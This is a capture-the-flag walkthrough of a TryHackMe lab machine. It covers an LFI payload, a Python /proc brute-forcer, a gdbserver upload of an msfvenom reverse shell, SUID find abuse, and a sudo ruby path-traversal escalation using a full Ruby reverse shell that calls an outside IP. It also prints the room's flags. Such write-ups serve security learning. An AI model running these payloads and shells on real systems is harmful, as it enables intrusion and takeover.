#airplane #thm #medium #LFI #/proc #gdbserver #SUID #find

#### Ports
-> commands : 
	`rustscan -a 10.10.107.188`
	`nmap -p 22,6048,8000 10.10.107.188 -T4 -A -oN nmap.txt`
```
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack
6048/tcp open  x11      syn-ack
8000/tcp open  http-alt syn-ack
```

#### Directory Enumeration
-> commands :
	`feroxbuster -u http://10.10.107.188:8000/ -x txt,php,html,zip,pcap`
```
http://airplane.thm:8000/?page=index.html
```
-> found this only , not other dirs.

#### LFI
-> URL : http://airplane.thm:8000/?page=index.html
-> Payload : http://airplane.thm:8000/?page=/../../../../etc/passwd
-> got */etc/passwd* file
```
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
hudson:x:1001:1001::/home/hudson:/bin/bash
```

-> tried accessing a lot of files but no results

##### /proc part
-> then got introduced with a new concept .. 
	*/proc/< proc number>/cmdline* -> file
-> we can access any running process if we know the process number 
-> so we can run a python script to generate 1 to n numbers and send a get request , if we get the 200 on a perticular request it means that process is running , we might get somthing in processes , if we are unable to find nothing

-> python script 
```
import requests  
  
def read_file(base_url, path):  
    file_url = f"{base_url}/?page=../../../../{path}"  
    try:  
        response = requests.get(file_url)  
        if response.status_code == 200:  
            return response.text  
        else:  
            return None  
    except Exception as e:  
        print(f"Error reading {path}: {e}")  
        return None  
  
def find_pid_by_port(base_url, port):  
    for pid in range(1, 5000):  # Adjust the range based on the expected number of PIDs  
        cmdline_path = f"proc/{pid}/cmdline"  
        cmdline = read_file(base_url, cmdline_path)  
        if cmdline:  
            if str(port) in cmdline:  
                return pid  
    return None  
  
# Example usage  
base_url = 'http://airplane.thm:8000'  
port = '6048'  
pid = find_pid_by_port(base_url, port)  
if pid:  
    cmdline = read_file(base_url, f"proc/{pid}/cmdline")  
    status = read_file(base_url, f"proc/{pid}/status")  
    print(f'PID using port {port}: {pid}')  
    print(f'Command line: {cmdline}')  
    print(f'Status: {status}')  
else:  
    print(f'No process found using port {port}')
```

-> found a process name ->
	-> /proc/530/cmdline 
	-> it was running `/usr/bin/gdbserver0.0.0.0:6048airplane`

#### Gaining Shell as hudson
##### GdbServer Vulnerability 

-> enumerated -> found hacktrickz article 
-> https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver?ref=benheater.com
```
# Trick shared by @B1n4rySh4d0w
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.17.127.143 LPORT=4444 PrependFork=true -f elf -o binary.elf

chmod +x binary.elf

gdb binary.elf

# Set remote debuger target
target extended-remote 10.10.82.135:6048

# Upload elf file
remote put binary.elf /tmp/binary.elf

# Set remote executable file
set remote exec-file /tmp/binary.elf

# Execute reverse shell executable
run

# You should get your reverse-shell
```

ran these commands and got reverse shell !!

#### Getting better Shell

-> `ssh-keygen -t rsa -f rghx -b 4096`
-> got two files rghx & rghx.pub 
-> copied rghx.pub in ~/.ssh/authorized_keys *{in victim's shell}*
-> `chmod 600 rghx`
-> `ssh -i rghx hudson@airplane.thm`

#### Post Exploitation Enumeration

-> linpeas
-> `/usr/bin/find` -> SUID set for carlos user

#### Shell as Carlos

-> `/usr/bin/find /home/carlos -name "user.txt" -exec cat /home/carlos/user.txt \;` -> to read user.txt
-> `/usr/bin/find /home/carlos -name "user.txt" -exec /bin/bash -p \;`

-> got perms to access & edit carlos files
-> did the same ssh generation and replacing ssh keys to 
	/home/carlos/.ssh/authorized_keys
-> `chmod 644 authorized_keys` --> important step

-> `ssh -i id_rsa carlos@IP`

###### user.txt : ***eebfca2ca5a2b8a56c46c781aeea7562***

#### Privilege Escalations

`sudo -l`
```
(ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

-> here , after thinking for a minute i though to do path escaping 
-> so i wrote a ruby reverse shell {thankx to chat GPT}

`shell.rb`
```ruby
require 'socket'

# Exit if the process is a child
exit if fork

# Create a TCP socket connection to the specified address and port
c = TCPSocket.new("10.17.127.143", "9002")

# Continuously read commands from the socket
loop do
  # Read a line from the socket and remove the trailing newline character
  command = c.gets.chomp
  
  # Exit if the command is "exit"
  break if command == "exit"
  
  # Change directory if the command starts with "cd"
  if command =~ /cd (.+)/i
    begin
      Dir.chdir($1)
    rescue => e
      c.puts "failed to change directory: #{e.message}"
    end
  else
    # Execute the command and send the output to the socket
    begin
      IO.popen(command, 'r') do |io|
        c.print io.read
      end
    rescue => e
      c.puts "failed: #{e.message}"
    end
  end
end
```

-> put it in /tmp/shell.rb
-> `sudo /usr/bin/ruby /root/../tmp/shell.rb`
-> Boom!! Got reverse Shell as root !

###### root.txt : ***190dcbeb688ce5fe029f26a1e5fce002***
---------

